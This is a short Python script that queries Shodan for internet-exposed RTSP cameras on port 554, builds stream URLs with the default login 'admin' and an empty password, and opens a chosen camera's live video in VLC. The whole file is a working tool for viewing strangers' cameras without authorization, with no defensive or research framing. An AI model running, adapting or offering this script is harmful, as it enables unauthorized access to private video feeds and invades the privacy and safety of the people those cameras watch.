import shodan, IPython, vlc, time

SHODAN_API_KEY = 'INSERTKEYHERE'

api = shodan.Shodan(SHODAN_API_KEY)

#"rtsp://%s:554" % chosen_result['ip_str']

try:
    results = api.search('port:554 has_screenshot:true')
    print('[+] Results found: %s' % results['total'])
    ip_choices = ["rtsp://admin:@%s:554" % res['ip_str'] for res in results["matches"]]
    for i in range(len(ip_choices)):
        print("[{}] {}".format(i,ip_choices[i]))
    cont = True
    while(cont):
        ip = ip_choices[max(0,min(int(input("[#] Enter an index to connect to ")),len(ip_choices)-1))]
        v = vlc.Instance()
        print(ip)
        media = v.media_new_location(ip)
        player = v.media_player_new()
        player.set_media(media)
        event = player.event_manager()
        ret = player.play()
        print(ret)
        if(ret >= 0):
            input("[#] Hit any key to continue ")
            player.stop()
            cont = input("[#] Continue attempts? y/n ").lower() == "y"
        else:
            print("[-] Failed to connect")
        #IPython.embed()


except shodan.APIError as e:
    print('[-] Error: %s' % e)